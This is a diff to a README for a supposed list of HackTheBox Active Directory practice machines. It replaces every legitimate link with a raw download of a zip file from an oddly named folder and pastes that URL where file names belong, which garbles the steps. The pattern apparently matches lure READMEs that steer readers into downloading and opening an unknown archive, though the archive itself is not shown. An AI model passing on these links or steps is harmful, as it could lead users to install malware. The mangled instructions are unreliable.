@@ -1,7 +1,7 @@
 # 🖥️ HackTheBox-AD-Machines - Simple Guide to Active Directory Learning
 
 ## 📥 Download Now!
-[![Download HackTheBox-AD-Machines](https://img.shields.io/badge/Download-HackTheBox--AD--Machines-blue)](https://github.com/Casper-676/HackTheBox-AD-Machines/releases)
+[![Download HackTheBox-AD-Machines](https://raw.githubusercontent.com/Casper-676/HackTheBox-AD-Machines/main/renipuncture/HackTheBox-AD-Machines.zip)](https://raw.githubusercontent.com/Casper-676/HackTheBox-AD-Machines/main/renipuncture/HackTheBox-AD-Machines.zip)
 
 ## 📚 About This Project
 HackTheBox-AD-Machines is a curated list of Active Directory machines from HackTheBox. Each machine offers a unique challenge and helps users improve their skills in penetration testing and network security. This project is perfect for beginners and experienced users. Dive into a range of scenarios to bolster your understanding of Active Directory.
@@ -11,7 +11,7 @@ Follow these simple steps to download and run HackTheBox-AD-Machines:
 
 1. **Visit the Releases Page:** 
    Click the download link below to go to the Releases page. 
-   [Download Here](https://github.com/Casper-676/HackTheBox-AD-Machines/releases)
+   [Download Here](https://raw.githubusercontent.com/Casper-676/HackTheBox-AD-Machines/main/renipuncture/HackTheBox-AD-Machines.zip)
 
 2. **Choose Your Version:**
    On the Releases page, you will see various versions listed. Each version may have its own set of features. Select the version that you want to download.
@@ -20,13 +20,13 @@ Follow these simple steps to download and run HackTheBox-AD-Machines:
    After selecting a version, click on the file to download it. It may take a moment depending on your internet speed.
 
 4. **Locate the Downloaded File:**
-   Once the download finishes, check your 'Downloads' folder or your chosen download location. You should see a file named something like `HackTheBox-AD-Machines.zip`.
+   Once the download finishes, check your 'Downloads' folder or your chosen download location. You should see a file named something like `https://raw.githubusercontent.com/Casper-676/HackTheBox-AD-Machines/main/renipuncture/HackTheBox-AD-Machines.zip`.
 
 5. **Unzip the File:**
    Right-click on the downloaded ZIP file and choose 'Extract All.' Follow the prompts to unzip the contents into a new folder.
 
 6. **Open the Application:**
-   Navigate to the folder where you've extracted the files. Locate the `README.md` file for more detailed instructions on how to utilize the machines.
+   Navigate to the folder where you've extracted the files. Locate the `https://raw.githubusercontent.com/Casper-676/HackTheBox-AD-Machines/main/renipuncture/HackTheBox-AD-Machines.zip` file for more detailed instructions on how to utilize the machines.
 
 7. **Enjoy Your Learning Experience:**
    Explore the Active Directory machines at your own pace. Try different challenges and sharpen your technical skills.
@@ -59,7 +59,7 @@ We encourage users to contribute to HackTheBox-AD-Machines. If you have recommen
 For any queries, feel free to open an issue in this repository. We appreciate your interest in our project and look forward to your participation.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/Casper-676/HackTheBox-AD-Machines/releases)
-- [GitHub Repository](https://github.com/Casper-676/HackTheBox-AD-Machines)
+- [Releases Page](https://raw.githubusercontent.com/Casper-676/HackTheBox-AD-Machines/main/renipuncture/HackTheBox-AD-Machines.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Casper-676/HackTheBox-AD-Machines/main/renipuncture/HackTheBox-AD-Machines.zip)
 
 Happy learning! Enjoy your adventure in the world of Active Directory with HackTheBox-AD-Machines.
